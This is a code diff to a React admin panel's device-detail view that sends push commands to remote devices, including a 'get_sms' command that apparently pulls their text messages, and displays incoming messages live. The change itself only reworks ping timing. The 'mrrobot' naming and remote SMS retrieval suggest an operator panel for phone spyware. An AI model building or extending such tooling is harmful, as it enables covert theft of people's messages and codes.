@@ -1337,34 +1337,67 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
   const [pingCountdown, setPingCountdown] = useState(0);
   const [getSmsState, setGetSmsState] = useState<FcmState>("idle");
 
-  // Countdown timer for ping
-  useEffect(() => {
-    if (pingState !== "sending") return;
-    setPingCountdown(0);
-    const iv = setInterval(() => setPingCountdown(c => c + 1), 1000);
-    const t = setTimeout(() => { setPingState("idle"); setPingCountdown(0); }, 30000);
-    return () => { clearInterval(iv); clearTimeout(t); };
-  }, [pingState]);
+  // Sub-admin pattern: flag so only active pings trigger "ok" — not regular heartbeats
+  const pingActiveRef = useRef(false);
+  const pingTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  // Auto-reset on device_updated (ping responded)
+  function stopPingTimer() {
+    if (pingTimerRef.current) { clearInterval(pingTimerRef.current); pingTimerRef.current = null; }
+  }
+
+  // Live: mrrobot:device_updated → ONLY fire success if ping was actively waiting
   useEffect(() => {
     function onUpdated(e: Event) {
       const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
       if (deviceId !== device.deviceId) return;
+      if (!pingActiveRef.current) return; // ignore regular heartbeats — sub-admin pattern
+      pingActiveRef.current = false;
+      stopPingTimer();
+      setPingCountdown(0);
       setPingState("ok");
-      setTimeout(() => { setPingState("idle"); setPingCountdown(0); }, 3000);
+      setTimeout(() => setPingState("idle"), 2000);
     }
     window.addEventListener("mrrobot:device_updated", onUpdated);
-    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
+    return () => { window.removeEventListener("mrrobot:device_updated", onUpdated); stopPingTimer(); };
+  }, [device.deviceId]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // Live: mrrobot:message_added → prepend new messages for this device automatically
+  useEffect(() => {
+    function onMsg(e: Event) {
+      const payload = (e as CustomEvent<{ appId: string; message: MsgRow }>).detail;
+      if (payload.message.deviceId !== device.deviceId) return;
+      setDevMsgs(prev => {
+        if (prev.some(m => m.id === payload.message.id)) return prev;
+        return [payload.message, ...prev];
+      });
+    }
+    window.addEventListener("mrrobot:message_added", onMsg);
+    return () => window.removeEventListener("mrrobot:message_added", onMsg);
   }, [device.deviceId]);
 
   async function firePing() {
     if (!device.hasFcm) return;
+    // Arm the flag BEFORE sending — sub-admin exact pattern
+    pingActiveRef.current = true;
+    stopPingTimer();
+    setPingCountdown(0);
     setPingState("sending");
+    // Live countdown 0 → 30s
+    pingTimerRef.current = setInterval(() => {
+      setPingCountdown(c => {
+        if (c >= 30) {
+          pingActiveRef.current = false;
+          stopPingTimer();
+          setPingState("idle");
+          return 0;
+        }
+        return c + 1;
+      });
+    }, 1000);
     try {
       const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
-      if (!r.ok) { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
-    } catch { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
+      if (!r.ok) { pingActiveRef.current = false; stopPingTimer(); setPingCountdown(0); setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
+    } catch { pingActiveRef.current = false; stopPingTimer(); setPingCountdown(0); setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
   }
 
   async function fireGetSms() {
@@ -1374,7 +1407,7 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
       const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "get_sms" } }) });
       if (!r.ok) { setGetSmsState("err"); setTimeout(() => setGetSmsState("idle"), 3000); return; }
       setGetSmsState("ok");
-      setTimeout(() => setGetSmsState("idle"), 4000);
+      setTimeout(() => setGetSmsState("idle"), 2500);
     } catch { setGetSmsState("err"); setTimeout(() => setGetSmsState("idle"), 3000); }
   }
 
